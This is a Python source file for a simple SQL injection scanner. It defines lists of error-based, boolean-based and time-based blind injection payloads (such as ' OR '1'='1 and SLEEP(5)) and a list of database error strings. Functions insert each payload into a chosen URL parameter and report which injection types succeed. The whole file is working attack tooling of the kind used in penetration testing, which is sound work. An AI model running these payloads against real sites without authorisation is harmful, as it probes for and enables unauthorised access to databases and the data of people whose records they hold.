import requests
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ⚠️ Basic payloads (extend later)
ERROR_PAYLOADS = ["'\"", "' OR '1'='1", "';", '" OR "1"="1']
TIME_PAYLOADS = ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"]

SQL_ERRORS = [
    "SQL syntax", "mysql_fetch", "ORA-01756", "unterminated", 
    "unexpected end", "pg_query", "You have an error", "ODBC"
]

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    if param not in query:
        return None, "Parameter not found"

    query[param] = payload
    new_query = urlencode(query, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    try:
        before = time.time()
        resp = requests.get(new_url, timeout=10)
        duration = time.time() - before

        return resp, duration
    except requests.exceptions.RequestException as e:
        return None, str(e)

def detect_sqli(url, param):
    print(f"\n🎯 Testing parameter '{param}' in URL: {url}")
    findings = []

    # Error-based testing
    for payload in ERROR_PAYLOADS:
        resp, _ = inject_payload(url, param, payload)
        if resp and any(err.lower() in resp.text.lower() for err in SQL_ERRORS):
            findings.append((payload, "🧨 Error-Based SQLi"))

    # Boolean-based testing
    true_payload = "' OR 1=1--"
    false_payload = "' OR 1=2--"

    resp_true, _ = inject_payload(url, param, true_payload)
    resp_false, _ = inject_payload(url, param, false_payload)

    if resp_true and resp_false and resp_true.text != resp_false.text:
        findings.append((true_payload + " / " + false_payload, "🔁 Boolean-Based SQLi"))

    # Time-based (blind)
    for payload in TIME_PAYLOADS:
        _, duration = inject_payload(url, param, payload)
        if isinstance(duration, float) and duration > 4.5:
            findings.append((payload, f"⏱️ Time-Based SQLi ({duration:.2f}s)"))

    return findings
